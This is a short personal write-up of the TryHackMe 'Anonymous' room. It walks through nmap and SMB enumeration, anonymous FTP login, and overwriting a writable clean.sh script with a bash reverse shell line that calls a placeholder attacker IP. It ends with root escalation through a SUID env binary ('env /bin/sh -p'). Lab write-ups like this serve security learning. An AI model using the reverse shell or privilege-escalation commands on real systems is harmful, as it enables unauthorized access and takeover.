---
created: 2026-02-25
tags:
  - note
  - journal
  - cyberStuff
title: anonymous
draft: false
date:
subiect:
dificultate: 3
amuca: false
link:
  - https://tryhackme.com/room/anonymous
lastmod: 2026-10-09T12:31:28.825Z
---
To answer the first two questions, run a basic nmap scan:\
![](/images/static/Pasted%20image%2020260225133840.png)

Then let's enumerate the SMB service:\
Note: SMB (Server Message Block) is a communication protocol used to share files, printers, serial ports, and miscellaneous communications.\
![](/images/static/Pasted%20image%2020260225134257.png)\
OK, interesting; let's verify those SMB files:\
![](/images/static/Pasted%20image%2020260225134958.png)\
I downloaded those two files and checked them, but found nothing too interesting.\
Let's check FTP now:

![](/images/static/Pasted%20image%2020260225135546.png)\
I accessed the FTP server and enumerated it (logged in with anonymous credentials, which means empty password, OK cool), then I found a scripts folder and retrieved its contents:

Looking inside those files, only clean.sh seems interesting:\
![](/images/static/Pasted%20image%2020260225140022.png)\
Yeah, nothing really cool, but let's rewind a little bit.\
Looking back at the permissions of the files we downloaded, we see that:\
![](/images/static/Pasted%20image%2020260225140336.png)\
clean.sh has write permissions enabled, so let's try to create our own clean.sh and overwrite it.

OK, so what I did was replace clean.sh content with:

```
#!/bin/bash 
bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1
```

Then I uploaded the file to the system via FTP:\
![](/images/static/Pasted%20image%2020260225140827.png)\
And in just a few seconds, I got a reverse shell:\
![](/images/static/Pasted%20image%2020260225140932.png)\
Boom, and we got user.txt and the pics folder — the other two answers.

I enumerated SUID binaries with:

```
find / -perm -u=s -type f 2>/dev/null
```

And luckily I found good old env:\
![](/images/static/Pasted%20image%2020260225144302.png)\
Cool, let's use that:\
![](/images/static/Pasted%20image%2020260225144413.png)\
And bam, with:

```
env /bin/sh -p
```

We are root now, ez, very cool room!
